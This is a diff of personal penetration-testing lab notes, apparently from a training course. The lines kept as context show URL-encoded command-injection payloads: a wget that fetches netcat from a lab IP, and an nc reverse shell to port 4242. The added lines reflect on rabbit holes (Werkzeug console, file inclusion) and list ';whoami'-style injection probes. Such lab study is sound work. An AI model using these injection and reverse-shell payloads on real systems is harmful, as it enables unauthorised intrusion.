@@ -262,6 +262,16 @@ git+--version%3Bwget+192.168.45.228%3a80/nc+-P+/home/stanley/nc
 
 This worked and allowed me to run the payload
 git+--version%3Bcd+/home/stanley/%3bnc%20-c%20sh%20192.168.45.228%204242
+
+One thing I need to work on is not diving into rabit holes... I found a bunch of articles talking about wergzueg pin traversal, RCE on console, even for the specific version running. Ultimately this ended up being a rabbit hole.
+I was reading sourcecode and trying to inject in the cmd arg for console.py, and got a valid file inclusion. but there was no exploit. I actually attempted to exploit the correct vector but gave up before finding the payload.
+
+Concepts to focus on
+Simple payloads to verify if a vulnerability exists
+
+Bash command injection test used in this course
+;whoami
+"&&whoami
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
